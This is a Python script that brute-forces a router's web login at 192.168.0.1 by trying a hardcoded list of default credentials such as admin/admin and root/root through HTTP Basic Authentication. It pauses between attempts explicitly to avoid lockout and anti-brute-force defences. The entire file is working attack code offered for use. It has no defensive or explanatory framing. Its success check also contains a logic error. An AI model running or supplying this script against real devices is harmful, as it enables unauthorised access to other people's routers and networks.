import requests
from base64 import b64encode
import time

# Target URL for the router's login page
url = "http://192.168.0.1/"  # Replace with actual login endpoint if different

# Common username-password combinations for credential stuffing
credentials = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "1234"),
    ("admin", "12345"),
    ("user", "user"),
    ("admin", "123456"),
    ("root", "root"),
    ("guest", "guest")
]

# Headers setup
headers = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "*/*",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Function to perform the brute-force attack
def brute_force_login(url, credentials):
    for username, password in credentials:
        # Encode the username and password in Base64
        credentials_encoded = b64encode(f"{username}:{password}".encode("utf-8")).decode("utf-8")
        
        # Set the Authorization header with Basic Authentication format
        headers["Authorization"] = f"Basic {credentials_encoded}"
        
        # Send the request
        response = requests.get(url, headers=headers)
        
        # Print the result of each attempt
        print(f"Trying {username}:{password}")
        print(f"Status Code: {response.status_code}")
        
        # Check if login was successful
        if response.status_code == 200 and "login failed" and "error" not in response.text.lower():
            print(f"Success! Credentials found: {username}:{password}")
            break
        else:
            print("Login failed or account locked. Retrying...")
        
        # Sleep to avoid triggering lockout or anti-brute-force mechanisms (optional)
        time.sleep(1)  # Adjust as needed

# Run the brute-force attack
brute_force_login(url, credentials)
